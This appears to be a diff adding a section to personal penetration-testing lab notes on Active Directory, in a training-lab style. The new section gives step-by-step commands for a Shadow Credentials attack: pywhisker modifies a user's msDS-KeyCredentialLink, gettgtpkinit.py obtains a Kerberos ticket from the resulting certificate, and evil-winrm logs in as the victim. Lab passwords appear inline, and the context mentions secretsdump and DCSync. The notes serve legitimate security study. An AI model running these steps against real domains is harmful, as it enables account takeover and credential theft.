@@ -656,6 +656,22 @@ $ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administr
 ```
 %% pass-the-certificate attack with gettgtpkinit then a dscync attack %%
 
+### Shadow Credentials (msDS-KeyCredentialLink)
+
 ```
 $ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add
 ```
+%% using pywhisker to exploit the AddKeyCredentialLink where a user has write permissions over another user's msDS-KeyCredentialLink attribute, allowing them to take control of that user. %%
+
+```
+$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+```
+%% In the output above, we can see that a PFX (PKCS12) file was created (eFUVVTPf.pfx), and the password is shown. We will use this file with gettgtpkinit.py to acquire a TGT as the victim %%
+
+```
+$ export KRB5CCNAME=/tmp/jpinkman.ccache
+$ klist
+$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
+```
+%% with the TGT obtained we can pass the ticket and connect to machine via WinRM as the victim user(check krb.conf to ensure it is properly configured) %%
+
